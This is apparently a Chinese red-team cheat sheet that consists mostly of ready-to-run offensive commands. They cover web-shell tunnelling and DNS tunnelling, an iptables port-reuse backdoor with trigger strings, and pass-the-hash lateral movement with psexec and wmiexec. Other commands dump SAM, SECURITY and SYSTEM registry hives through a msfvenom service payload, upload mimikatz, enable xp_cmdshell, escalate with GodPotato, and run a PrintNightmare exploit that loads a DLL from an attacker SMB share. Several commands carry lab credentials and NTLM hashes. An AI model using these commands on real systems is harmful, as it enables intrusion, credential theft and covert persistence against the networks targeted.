       不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
3. vps执行./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
此时已经在vps127.0.0.1:60000启动了一个example.com所在内网的socks4a代理
此时已经将目标服务器的127.0.0.1:60020映射到vps的127.0.0.1:60020

...

```

## regeorg

pip install 安装

上传 php 到服务器

```sh
python reGeorgSocksProxy.py -u 靶机reGeorg脚本地址 -p 本地监听端口

vi /etc/proxychains.conf
# 添加
socks5 127.0.0.1 本地监听端口
:wq

proxychains 命令
```

## Neo-reGeorg

Public

```bash
python neoreg.py generate -k <your_password>
python3 neoreg.py -k password -u http://xx/tunnel.php

```

## SoftEther VPN 内网穿透

[SoftEther VPN 内网穿透](https://mp.weixin.qq.com/s/Xim1SKnU41Z_rb9aI0QdDA)

## [端口复用](90_tools_01_端口复用.md)

[Linux 远控的端口复用](https://mp.weixin.qq.com/s/mHCOuR1rq2ExEYYWhA4vQg)
[Linux 持久化—IPTables 端口复用](https://mp.weixin.qq.com/s/k_C2d_H2Z_sRlJR_QRh55g)
[Windows server 80 端口复用后门](https://mp.weixin.qq.com/s/unZEw-0r4LJKCGTAIsHYUA)
[不同中间件端口复用代理解决方案](https://mp.weixin.qq.com/s/fBy9qiu9ELNB2TiFIgGMAQ)

iptable

```sh
# 新建端口复用链
iptables -t nat -N LETMEIN
# 端口复用规则
iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
# 开启端口复用开关
iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
# 关闭端口复用开关
iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
# 开启端口复用
iptables -t nat -A PREROUTING -p tcp --dport 8000 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
```

(2) 使用 socat 连接
使用 socat 发送约定口令至目标主机打开端口复用开关

echo threathuntercoming | socat ‐ tcp:192.168.245.135:8000
使用完毕后，发送约定关闭口令至目标主机目标端口关闭端口复用

echo threathunterleaving | socat ‐ tcp:192.168.245.135:8000

## 其他隧道

ICMP 隧道 [icmp 隧道](https://mp.weixin.qq.com/s/Iuk7vENAOq6PPDHAzJNJxA)

- icmpsh
- pingtunnnel

DNS 隧道

- dns2tcp
- dnscat2
- iodine

- [内网代理工具 rakshasa](https://github.com/Mob2003/rakshasa)

# 远程桌面

## xfreerdp

```bash
xfreerdp /u:test /p:1qaz@WSX /v:192.168.127.137 /sec:rdp
xfreerdp  -u test -p 1qaz@WSX -sec rdp -v 192.168.127.137
xfreerdp /proxy:socks5://47.92.64.139:1234 /v:172.22.4.45 /u:'WIN19\Adrian' /p:babygirl1
xfreerdp /u:CONTOSO\JohnDoe /p:Pwd123! /v:1.2.3.4
xfreerdp /drive:kali,home/kali/vmware /v:127.0.0.1 /u:MyUser /p:MyPasswd
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd
xfreerdp /v:${your ip} /u:${your user name} /f /monitors:1 +fonts +window-drag +clipboard
xfreerdp /proxy:socks5://127.0.0.1:1080 /drive:kali,home/kali/vmware /v:127.0.0.1 /u:MyUser /p:MyPasswd
/proxy:[<proto>://][<user>:<password>@]<host>:<port>
```

## remmina

basic 里可以设置共享文件夹

socks5 代理

```shell
vi ~/.local/share/remmina/xxx.remmina
proxy_hostname=192.168.50.161
proxy_type=socks5
proxy_port=2080
# http代理
http_proxy=http://username:password@proxyserver.net:port/
http_proxy=http://192.168.50.161:2080/
```

## rustdesk 多平台/支持内网点对点

[Link](https://github.com/rustdesk/rustdesk/releases)

允许 IP: ID 右侧三个点 -> 允许 IP 直连

## evil-winrm 远程命令执行/ssh

[Link](https://mp.weixin.qq.com/s/fSkygmxijKk70qJ32Ay83g)

```sh
evil-winrm -i 172.16.1.10 -u backup_svc -p 'Makemoney1!'
# win自带命令 winrs
## 远程执行命令
winrs -r:http://192.168.2.153:5985 -u:desktop-r3kfb05\hacker -p:qwe123.. "ipconfig"
## 打开CMD交互
winrs -r:http://192.168.1.20 -u:用户名 -p:密码 cmd

## 上传文件
*Evil-WinRM* PS$ upload /tmp/m/mimidrv.sys .
*Evil-WinRM* PS$ upload /tmp/m/mimilib.dll .
*Evil-WinRM* PS$ upload /tmp/m/mimispool.dll .
*Evil-WinRM* PS$ upload /tmp/m/mimikatz.exe .

```

# other

[防封 ip 解决方案之 ip 代理池](https://mp.weixin.qq.com/s/jteH4KuRoSW6ozIwNm9NPg)

## linpeas

```sh
./linpeas.sh | tee linlog.txt
```

## keystore,keytool,ssl 证书解密 pcap

```shell
keytool -list -keystore c:\keystore # 输入密钥库口令tomcat
# 从密钥库导出.p12证书，将keystore拷贝到keytool目录，导出名为：tomcatkeystore.p12的证书，命令：
keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat

# 将.p12证书导入Wireshark
# 在Wireshark中打开 .pcap, 菜单: 编辑–首选项–Protocols–SSL，点击右边的Edit：输入：192.168.110.140 8443 http 点击选择证书文件 输入密码tomcat
```

## 向日葵\_识别码和验证码提取工具

https://github.com/wafinfo/Sunflower_get_Password

## Sql Tools

Multiple.Database.Utilization.Tools
激活 Ole automation procedures 点击激活，日志提示激活成功之后即可使用。

# Domain/域

## psexec.exe

```sh
psexec -accepteula -s -i -d cmd.exe                       # 进入system
psexec -accepteula \\192.168.108.101 -s cmd.exe           # 交互式shell
psexec \\ip -u administrator -p admin cmd                 # 交互式shell
psexec \\ip -u administrator -p admin -w c:\cmd           # 交互式shell，且c:\是⽬标机器的⼯作⽬录
psexec \\ip -u administrator -p admin whoami all          # 执行命令
psexec \\ip -u administrator -p admin -d c:\beacon.exe    # 执行文件
psexec \\ip -u administrator -p admin -h -d c:\beacon.exe # UAC的⽤⼾权限执行文件
```

## impacket/psexec.py

```sh
pip install impacket
# 安装后产生命令
impacket-xxxx
impacket-GetNPUsers
```

```sh
# 注意前缀本例是域名 god/
# 1.命令行
python psexec.py god/administrator:hongrisec@2019@192.168.52.143
python smbexec.py god/administrator:hongrisec@2019@192.168.52.143
## hash 认证
python psexec.py -hashes :8a963371a63944419ec1adf687bb1be5 god/administrator@192.168.52.143
# 1.1 msf msf_psexec.rc
# 2.执行命令
python psexec.py god/administrator:hongrisec@2019@192.168.52.143 ipconfig
# 3.上传文件并执行
python psexec.py god/administrator:hongrisec@2019@192.168.52.143 -c 1.bat

# 修改密码
proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 111qqq...
# 登录测试
proxychains4 -q -f proxychains.conf python3 ldapshell.py xiaorang.lab/Aldrich:111qqq...@172.22.8.15

# 注册表文件 sam security system 导出hash, 见 delegation
msfvenom -p windows/x64/exec cmd="C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\sam.bat" --platform windows -f exe-service > delegation.exe
## sam.bat
reg save HKLM\SYSTEM C:\Users\Adrian\Desktop\system
reg save HKLM\SAM C:\Users\Adrian\Desktop\sam
reg save HKLM\SECURITY C:\Users\Adrian\Desktop\security
## run this
reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Adrian\Desktop\delegation.exe" /f
sc start gupdate
## get hash
/home/kali/.local/bin/secretsdump.py LOCAL -sam /tmp/sam -security /tmp/security -system /tmp/system
```

| pyfile     | commands         |
| ---------- | ---------------- |
| psexec.py  | impacket-psexec  |
| smbexec.py | impacket-smbexec |
|            |                  |

## impacket/wmiexec.py/nxc

```sh
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 lget {file}                 - downloads pathname to the current local dir
 ! {cmd}                    - executes a local shell cmd

proxychains impacket-wmiexec pentest.me/Administrator@172.24.7.43 -hashes :5d0f79eaf7a6c0ad70bcfce6522d2da1
proxychains -q nxc smb 172.24.7.43  -u Administrator -H 5d0f79eaf7a6c0ad70bcfce6522d2da1 -x 'type C:\Users\userb\Desktop\flag.txt' --codec GBK
proxychains python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fbe5588a79e40d41d77a40569c7b3090 nasa.gov/administrator@10.10.10.140 -codec gbk
proxychains python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3

## 上传文件
lput /tmp/m/mimilib.dll .
lput /tmp/m/mimispool.dll .
lput /tmp/m/mimikatz.exe .
## 下载文件
lget ./file
```

## impacket/smb-server

```sh
# 本机启动smb, 可通过 IP\smb 访问本机目录
impacket-smbserver smb /tmp/
python3 CVE-2021-1675.py hacker.test/win10:ShiJinBuShi@192.168.110.110 '\\192.168.110.132\smb\sjbs.dll'
```

## impacket/mssql/nxc

```sh
proxychains4 -q nxc mssql 172.26.8.16 -u sa -p sqlserver_2022 --local-auth -x whoami
proxychains4 -q nxc mssql 172.26.8.16 -u sa -p sqlserver_2022 --local-auth --put-file '/home/kali/GodPotato-NET4.exe' C:\\Windows\\Temp\\GodPotato-NET40.exe
proxychains4 -q nxc mssql 172.26.8.16 -u sa -p sqlserver_2022 --local-auth -x 'C:\\Windows\\Temp\\GodPotato-NET40.exe -cmd "cmd /c type \"C:\Users\Administrator\Desktop\flag.txt\""'

proxychains impacket-mssqlclient sa:'sqlserver_2022'@172.26.8.16
## 开启 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
exec xp_cmdshell 'dir c:\'
```

## mstsc

```bat
:: 1个服务器只能保留一个凭据
cmdkey /generic:"TERMSRV/192.168.50.153" /user:"admin" /pass:"123456"
mstsc /admin /v:192.168.50.153:33089
```

## mimikatz

[64 种运行 mimikatz 的方法(含 Bypass）](https://mp.weixin.qq.com/s/942pnjjTXvscIe6VErsKFw)

```bash
# multirdp
mimikatz.exe privilege::Debug ts::multirdp exit

# 通过注册表导出的 HKLM\Security,sam,system, 3个文件来导出hash
mimikatz.exe "lsadump::sam /system:system /sam:sam" exit
```

## bloodhound/sharphound/neo4j

- neo4j
- [download](https://neo4j.com/download-center/#community)

```bash
# (可选)配置 JAVA_HOME
neo4j.bat console
# 检查是否能登录
URL：neo4j://localhost:7687
用户名(默认)：neo4j
密码(默认)：neo4j
改为 neo4jneo4j
```

[SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) 采集,

```bash
# 方式1
SharpHound.exe -c all # BloodHound\resources\app\Collectors\SharpHound.exe
SharpHound.exe --ldapusername yangdming --ldappassword kier@n10 -c all

# 方式2
powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"
# 方式3
proxychains python3 bloodhound.py -u yangmei -p xrihGHgoNZQ -d xiaorang.lab --dns-tcp -ns 172.22.11.6 -c all --zip
# 4
proxychains bloodhound-python -d xiaorang.lab -u yangdming -p kier@n10 -gc dc.xiaorang.lab -c all
```

zip 压缩包的格式保存，拷贝到 BloodHound 主机上，右侧图标 Upload Data

文档

- [渗透测试之内网攻防篇：使用 BloodHound 分析大型域内环境](https://www.freebuf.com/articles/web/288370.html)

### neo4j 安装 / bloodhound 使用

```sh
cmd /c start http://localhost:7474/
# neo4j/neo4j
# 改为 neo4j/neo4jneo4j
bloodhound --nosandbox
```

- 拖拽 20230620232158_BloodHound.zip 到中间导入。
- 左上 Analysis - 随便点击
- 路径由粗到细的那边，就是 xx 对 xx 具有的权限或者说关系，所以路径如下

### neo4 FAQ

- neo4j.bat 找不到或无法加载主类 org.neo4j.server.startup.Neo4jCommand
- neo4jHOME 有问题，可以删除掉 或者设置为 当前路径

### dns 隧道

参考 TunnelX

1. 配置一个 VPS 的域名。

```sh
# 1. 添加A记录  test.example.com 指向 VPS
# 2. 添加NS记录 ns1.example.com  指向 test.example.com

# 3. 关闭VPS的53端口
systemctl stop systemd-resolved
docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb ns1.example.com -c datou
```

2. 在内网机器上运行 iodine 连接 VPS 组网

```sh
# dnscat和iodine都依赖53端口，照理来说应该要两台vps，那么我们如何在一台vps、一个域名的情况下完成代理呢？ A:让程序挂后台sleep一会。
chmod +x /tmp/iodine
nohup sleep 10 && /tmp/iodine -f -P datou ns1.example.com &
## 然后立即关闭 docker dns进程。启动 iodined

# 防火墙开放
vps$ firewall-cmd --add-port=53/udp  --permanent
vps$ firewall-cmd --reload
vps$ iodined -f -c -P datou 192.168.0.1 ns1.example.com -DD

## vps的localhost监听29999端口
vps$ ssh -N -D 29999 root@192.168.0.2
```

- 还需要利用 frp 把 vps 的 29999 端口映射到外部的 39999 端口，配置文件如下：

```sh
[common]
server_addr = 1.1.1.1
server_port = 7000

[yj]
type = tcp
local_ip = 127.0.0.1
local_port = 29999
remote_port = 39999
```

# 团队协作

rocketchat 局域网聊天工具。web 可传文件
synolog chat
